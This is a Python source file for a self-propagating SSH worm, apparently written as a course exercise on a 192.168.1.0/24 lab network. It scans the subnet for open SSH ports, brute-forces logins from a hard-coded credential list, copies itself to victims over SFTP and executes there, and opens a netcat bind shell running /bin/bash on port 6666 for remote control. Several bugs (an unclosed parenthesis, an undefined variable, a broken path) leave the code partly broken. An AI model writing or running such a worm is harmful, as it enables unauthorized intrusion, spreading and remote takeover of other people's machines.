import paramiko
import sys
import socket, fcntl, struct
import nmap
import netinfo
import os, os.path
import netifaces
import subprocess
import nclib

# The list of credentials to attempt
credList = [
    ('hello', 'world'),
    ('hello1', 'world'),
    ('root', '#Gig#'),
    ('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
def isInfectedSystem():
    return os.path.isfile("/tmp/infected.txt")


# Marks the system as infected
def markInfected():
    fileObj = open("/tmp/infected.txt", 'w')
    fileObj.write("Infected")
    fileObj.close()


# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
def spreadAndExecute(sftpClient):
    
    sftpClient.put("backdoor_worm.py", "/home/cpsc/Desktop/" + "backdoor_worm.py")
    ssh.exec_command("chmod a+x /home/cpsc/Desktop/backdoor_worm.py")
    stdin, stdout, stderr = ssh.exec_command('python / home/cpsc/Desktop/backdoor_worm.py')


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
    try:
        sshClient.connect(host, username= userName, password= password)
        return 0
    except paramiko.SSHException:
        return 1
    except socket.error:
        return 3


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
    global credList

    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    attemptResults = None

    for (username, password) in credList:
        attemptResults = tryCredentials(host, username, password, ssh)
        if attemptResults == 0:
                print "attackSystem - success"
                return ssh, username, password

    return None


# Returns the IP of the current system
def getMyIP():
    networkInterfaces = netifaces.interfaces()

    ip_addr = None

    for netFace in networkInterfaces:

        addr = netifaces.ifaddresses(netFace)[2][0]['addr']

        if not addr == "127.0.0.1":
            ip_addr = addr
            break

    return ip_addr


# Returns the list of systems on the same network
def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()
    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
    hostInfo = portScanner.all_hosts()
    liveHosts = []

    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host
    return liveHosts

# create backdoor terminal in victim's system that listens for commands
def listen(host):
	subprocess.call(["nc", "l", "-p", "6666", "-e", "/bin/bash"])

# sends terminal commands to backdoor port
def send(victim):
	for host in networkHosts:
		print host
	victim = raw_input("who do you want to control?")
	subprocess.call(["nc", victim, "6666"])
	


# Main
if len(sys.argv) < 2:
    # TODO: If we are running on the victim, check if
    # the victim was already infected. If so, terminate.
    # Otherwise, proceed with malice.
    if isInfectedSystem():
        print("infected!.... quitting")
        quit()
    markInfected()

ip_addr = getMyIP()

myAddr = "192.168.1.4"        #replace with ip of host 

# from the list of discovered systems
networkHosts = getHostsOnTheSameNetwork()
networkHosts.remove(myAddr)              # Remove Original host from targets

networkHosts.remove("192.168.1.1")
print "Found hosts: ", networkHosts

# Go through the network hosts
for host in networkHosts:

    # Try to attack this host
    print "attempting connection"
    ssh, user_name, password = attackSystem(host)
    print "Victim: ", host, " ", user_name, " ", password

    if ssh:
        print "Trying to spread."

        remotepath = '/tmp/infected.txt'
        localpath = '/home/cpsc/'

        sftpClient = ssh.open_sftp()
        try:
            sftpClient.get(remotepath, localpath)
        except IOError:
            spreadAndExecute(sftpClient)
            print("Spreading Complete")  	
	   
# create backdoor connection

#sends commands from attacker
if getMyIP() == "192.168.1.4":
	send(myAddr)
#listens to commands to run on command line
else:
	 listen(ssh)  
